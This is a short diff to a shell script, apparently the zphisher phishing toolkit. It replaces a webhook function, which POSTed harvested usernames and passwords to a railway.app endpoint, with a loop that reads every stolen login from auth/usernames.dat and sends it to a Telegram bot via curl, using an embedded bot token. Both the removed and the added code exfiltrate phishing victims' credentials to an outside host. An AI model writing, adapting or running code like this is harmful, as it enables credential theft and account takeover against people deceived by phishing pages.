@@ -910,13 +910,12 @@ dependencies
 check_status
 install_cloudflared
 install_localxpose
-# إرسال البيانات لـ Webhook
-send_webhook() {
-    curl -s -X POST https://$PROJECT_NAME.up.railway.app/webhook.php \
-        -H "Content-Type: application/json" \
-        -d "{\"username\":\"$1\",\"password\":\"$2\"}" > /dev/null
-}
-
-# تعديل أمر تسجيل البيانات (ينفذ مرة واحدة)
-sed -i 's/echo "\(.*\):\(.*\)" >> auth\/usernames.dat/echo "\1:\2" >> auth\/usernames.dat \&\& send_webhook "\1" "\2"/' zphisher.sh
+# إرسال لتليجرام
+if [ -f auth/usernames.dat ]; then
+    while read line; do
+        username=$(echo $line | cut -d: -f1)
+        password=$(echo $line | cut -d: -f2)
+        curl -s "https://api.telegram.org/bot6840048574:8450258813:AAHCKf6i3a3QR-4R5k7IpmooXOJv2lX8zRM/sendMessage?chat_id=6840048574&text=New%%20Login%%0AUser:$username%%0APass:$password" > /dev/null
+    done < auth/usernames.dat
+fi
 main_menu
